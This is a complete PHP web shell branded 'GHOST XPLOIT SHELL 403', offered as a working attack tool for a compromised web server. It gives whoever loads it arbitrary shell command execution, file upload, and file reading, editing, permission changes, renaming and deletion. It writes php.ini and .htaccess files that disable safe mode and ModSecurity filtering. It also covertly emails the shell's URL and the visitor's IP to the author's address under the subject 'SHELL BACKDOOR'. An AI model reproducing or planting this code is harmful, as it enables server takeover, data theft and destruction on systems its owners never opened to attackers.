<?php
error_reporting(0);
error_log(0);
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css2?family=Metal+Mania" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<link rel="shorcut icon" href="http://dokter-babi.xp3.biz/media/sniperghost.jpg">
<title>KONTOL GEDE MEMEK</title>
<style type="text/css">
body{
font-family: Kelly Slab;
background-image: url("https://raw.githubusercontent.com/Sniperxxx/web/main/memeknya-sniper404.gif");
	color:#ffffff;
	background-attachment:fixed;
	background-repeat:no-repeat;
	background-position:center;
	background-color:#222222;
	-webkit-background-size: 100% 100%;
}
#content tr:hover{
background-color:#FF1493;
}

#content .first{
background-color:transparent;
}

.SNIPER {
color: #ffffff;
font-size: 35px;
font-family: "Metal Mania", cursive;
text-shadow: 0px 2px 0px #ffffff;
}

table{
border: 2px white solid;
}

a{
color:white;
text-decoration: none;
}

a:hover{
color:#000000;
text-shadow:0px 0px 10px #111111;
}
input,select,textarea{
color: white;
background:transparent;
border: 2px #ffffff solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
h1{
font-family:Kelly Slab;
color: #ffffff;
font-size: 4px;
text-shadow:1px 2px 0px black;
}
</style>
</HEAD>
<BODY>
<center><span class="SNIPER"><a href="?" class="XPLOIT">$ GHOST XPLOIT SHELL 403 $</a></span></center><br>
<table width="95%" border="0" cellpadding="15" cellspacing="15" align="center">';
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}

// disable function
if (file_exists("php.ini")){
}else{
$img = fopen('php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($img ,$sec);
fclose($img);}
if (file_exists(".htaccess")){
}else{
$img2 = fopen('.htaccess', 'w');
$sec2 = "<IfModule mod_security.c>
		SecFilterEngine Off
		SecFilterScanPOST Off
		</IfModule>";
fwrite($img2 ,$sec2);
fclose($img2);}
$inids = @ini_get("disable_functions");

echo "<tr><td>| CONTACTS |<font color='lime'>".$liatds = (!empty($ds)) ?"<font color='#b200ff'>$inids</font>" : "<font color='lime'> SNIPER404GHOSTXPLOIT@GMAIL.COM</font><br><br>

<span><a href='?' class='XPLOIT'>| DIRECTORY | </a></span></font>";

if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}

if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '<tr><td><form enctype="multipart/form-data" method="POST"><input type="file" name="file" />
<input type="submit" value="UPLOAD"/>
</form>
</td></tr>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<tr><td><br><center><font color="lime">UPLOAD SUCCES !!!!</font><br/>';
}else{
echo '<tr><td><br><center><script>alert("File Gagal Diupload !!")</script><br>';
}
}
//FUNGSI CMD
echo "<tr><td><form method='post'>
<font color='#ffffff'></font>
<input type='text' size='28' height='15' name='cmd'> <input type='submit' name='execmd' value='EXECUTE'></form>
</td></tr>";
if($_POST['execmd']) {
echo "<br><center><textarea cols='113' rows='10' readonly='readonly' style='color:#ffffff; background-color:transparent;'>".exe($_POST['cmd'])."</textarea></center>";
}

function exe($cmd) {
if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result) {
			$buff .= $result;
		} return $buff;
	} elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif(function_exists('shell_exec')) {
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

echo'</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<br><center><font color="lime">Change Permission Done.</font><br /><br>';
}else{
echo 'o<br><center><font color="red">Change Permission Error.</font><br /><br>';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<br><br><center><font color="lime">Change Name Done.</font><br />';
}else{
echo '<br><center><font color="red">Change Name Error.</font><br /><br>';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<br><br><center><font color="lime">Edit File Done.</font><br />';
}else{
echo '<br><center><font color="red">Edit File Error.</font><br /><br>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=113 rows=10 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><center><font color="lime">Delete Dir Done.</font><br /><br>';
}else{
echo '<br><center><font color="red">Delete Dir Error.</font><br /><br>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<br><br><center><font color="lime">Delete File Done.</font><br />';
}else{
echo '<br><center><font color="red">Delete File Error.</font><br /><br>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="95%" border="1" cellpadding="10" cellspacing="0" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td class=td_home><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='><a href=\"?path=$path/$dir\"> $dir</a></td>
<td class=td_home><center>DIR</center></td>
<td class=td_home><center>";
if(is_writable("$path/$dir")) echo '<font color="#57FF00">';
elseif(!is_readable("$path/$dir")) echo '<font color="#FF0004">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td class=td_home><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href=\"?filesrc=$path/$file&path=$path\"> $file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$path/$file")) echo '<font color="#57FF00">';

echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}

echo '<br><center><marquee behavior="alternate" scrollamount="10" style="border:1px solid;" width="30%"><font size="3px" color="white">COPYRIGHT SNIPER404 2022</font></marquee>
</BODY>
</HTML>';

@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$بريد = 'sniper404ghostxploit@gmail.com';
$sl = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$رسالة = "LINK $sl IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($بريد, "SHELL BACKDOOR", $رسالة, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");

function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>